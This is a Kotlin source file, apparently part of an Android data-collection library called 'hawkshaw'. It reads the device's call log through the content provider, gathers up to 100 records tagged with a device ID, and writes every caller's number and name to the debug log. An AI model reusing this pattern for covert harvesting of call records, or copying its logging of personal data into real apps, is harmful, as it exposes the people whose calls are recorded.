package com.hawkshaw.library.features.telephony.calllogs

import android.content.ContentResolver
import android.database.Cursor
import android.os.Build
import android.provider.CallLog
import com.hawkshaw.library.datalayer.models.CallLog as CallLogModel
import kotlin.coroutines.Continuation
import android.util.Log // Added for logging

private const val TAG = "GetCallLogsKt" // Defined a TAG for this file
private const val MAX_CALL_LOGS = 100

// Added deviceId: String? as per the requirement
suspend fun getCallLogs(contentResolver: ContentResolver, deviceId: String?, continuation: Continuation<Any>): Any {
    Log.d(TAG, "[DEBUG] getCallLogs called. deviceId: $deviceId, MAX_CALL_LOGS: $MAX_CALL_LOGS")

    val projection = arrayOf(
        "number", "name", "date", "duration", "type", "new", "_id",
        "subscription_id", "features", "voicemail_uri", "subscription_id", "last_modified"
    )
    val sortOrder = "date DESC"
    Log.d(TAG, "[DEBUG] Querying CallLog.Calls.CONTENT_URI. Projection: ${projection.joinToString()}, SortOrder: $sortOrder")

    val cursor = contentResolver.query(
        CallLog.Calls.CONTENT_URI,
        projection,
        null, null, sortOrder
    )

    if (cursor == null) {
        Log.w(TAG, "[DEBUG] Cursor is null. Returning empty list.")
        return emptyList<CallLogModel>()
    }
    Log.d(TAG, "[DEBUG] Cursor obtained. Count: ${cursor.count}")

    cursor.use {
        Log.d(TAG, "[DEBUG] Inside cursor.use block.")
        val numberIndex = it.getColumnIndex("number")
        val nameIndex = it.getColumnIndex("name")
        val dateIndex = it.getColumnIndex("date")
        val durationIndex = it.getColumnIndex("duration")
        val typeIndex = it.getColumnIndex("type")
        val newIndex = it.getColumnIndex("new")
        val idIndex = it.getColumnIndex("_id")
        val simSlotIndex = it.getColumnIndex("subscription_id")
        val featuresIndex = it.getColumnIndex("features")
        val voicemailUriIndex = it.getColumnIndex("voicemail_uri")
        val phoneAccountIdIndex = it.getColumnIndex("subscription_id")
        val lastModifiedIndex = it.getColumnIndex("last_modified")

        Log.d(TAG, "[DEBUG] Column Indices: number=$numberIndex, name=$nameIndex, date=$dateIndex, duration=$durationIndex, type=$typeIndex, new=$newIndex, _id=$idIndex, subscription_id=$simSlotIndex, features=$featuresIndex, voicemail_uri=$voicemailUriIndex, last_modified=$lastModifiedIndex")

        var callScreeningAppNameIndex = -1
        var blockReasonIndex = -1
        if (Build.VERSION.SDK_INT >= 29) {
            Log.d(TAG, "[DEBUG] SDK version is ${Build.VERSION.SDK_INT} (>= 29). Getting 'call_screening_app_name' and 'block_reason' indices.")
            callScreeningAppNameIndex = it.getColumnIndex("call_screening_app_name")
            blockReasonIndex = it.getColumnIndex("block_reason")
            Log.d(TAG, "[DEBUG] Column Indices (SDK >= 29): call_screening_app_name=$callScreeningAppNameIndex, block_reason=$blockReasonIndex")
        } else {
            Log.d(TAG, "[DEBUG] SDK version is ${Build.VERSION.SDK_INT} (< 29). Skipping SDK 29 specific columns.")
        }

        val callLogs = ArrayList<CallLogModel>()
        var remaining = MAX_CALL_LOGS
        var rowNum = 0

        while (it.moveToNext() && remaining > 0) {
            rowNum++
            Log.d(TAG, "[DEBUG] Processing row $rowNum. Remaining quota: $remaining")
            remaining--

            // Log raw values before checks/conversions
            Log.d(TAG, "[DEBUG] Row $rowNum Raw Data: _id='${if (it.isNull(idIndex)) "NULL" else it.getString(idIndex)}', name='${if (it.isNull(nameIndex)) "NULL" else it.getString(nameIndex)}', number='${if (it.isNull(numberIndex)) "NULL" else it.getString(numberIndex)}', date='${if (it.isNull(dateIndex)) "NULL" else it.getString(dateIndex)}', duration='${if (it.isNull(durationIndex)) "NULL" else it.getString(durationIndex)}', type='${if (it.isNull(typeIndex)) "NULL" else it.getString(typeIndex)}', new='${if (it.isNull(newIndex)) "NULL" else it.getString(newIndex)}', subscription_id='${if (it.isNull(simSlotIndex)) "NULL" else it.getString(simSlotIndex)}', features='${if (it.isNull(featuresIndex)) "NULL" else it.getString(featuresIndex)}', voicemail_uri='${if (it.isNull(voicemailUriIndex)) "NULL" else it.getString(voicemailUriIndex)}', last_modified='${if (it.isNull(lastModifiedIndex)) "NULL" else it.getString(lastModifiedIndex)}'")
            if (Build.VERSION.SDK_INT >= 29) {
                 Log.d(TAG, "[DEBUG] Row $rowNum Raw Data (SDK >= 29): call_screening_app_name='${if (it.isNull(callScreeningAppNameIndex)) "NULL" else it.getString(callScreeningAppNameIndex)}', block_reason='${if (it.isNull(blockReasonIndex)) "NULL" else it.getString(blockReasonIndex)}'")
            }


            val id = if (it.isNull(idIndex)) null else it.getString(idIndex)
            val name = if (it.isNull(nameIndex)) null else it.getString(nameIndex)
            val number = if (it.isNull(numberIndex)) "" else it.getString(numberIndex) ?: ""
            val date = if (it.isNull(dateIndex)) 0L else it.getLong(dateIndex)
            val duration = if (it.isNull(durationIndex)) 0L else it.getLong(durationIndex)
            val type = if (it.isNull(typeIndex)) "" else it.getString(typeIndex) ?: ""
            val callNew = if (it.isNull(newIndex)) null else it.getString(newIndex)
            val subscriptionId = if (it.isNull(simSlotIndex)) null else it.getString(simSlotIndex)
            val features = if (it.isNull(featuresIndex)) null else it.getInt(featuresIndex)
            val voicemailUri = if (it.isNull(voicemailUriIndex)) null else it.getString(voicemailUriIndex)
            val phoneAccountId = if (it.isNull(phoneAccountIdIndex)) null else it.getString(phoneAccountIdIndex)
            val lastModified = if (it.isNull(lastModifiedIndex)) 0L else it.getLong(lastModifiedIndex)

            var callScreeningAppName: String? = null
            var blockReason: Int? = null
            if (Build.VERSION.SDK_INT >= 29) {
                callScreeningAppName = if (it.isNull(callScreeningAppNameIndex)) null else it.getString(callScreeningAppNameIndex)
                blockReason = if (it.isNull(blockReasonIndex)) null else it.getInt(blockReasonIndex)
            }

            val displayName = name ?: number
            Log.d(TAG, "[DEBUG] Row $rowNum - Processed displayName: '$displayName'")

            val callLogModel = CallLogModel(
                id = id,
                name = displayName,
                number = number,
                date = date,
                duration = duration,
                callType = type,
                callNew = callNew,
                simSlot = subscriptionId,
                features = features,
                voiceMailUri = voicemailUri,
                phoneAccountId = phoneAccountId,
                lastModified = lastModified,
                callScreeningAppName = callScreeningAppName,
                blockReason = blockReason
            )
            callLogs.add(callLogModel)
            Log.d(TAG, "[DEBUG] Row $rowNum - Added CallLogModel: $callLogModel")
        }
        Log.d(TAG, "[DEBUG] Finished processing cursor. Total call logs collected: ${callLogs.size}")
        return callLogs
    }
}

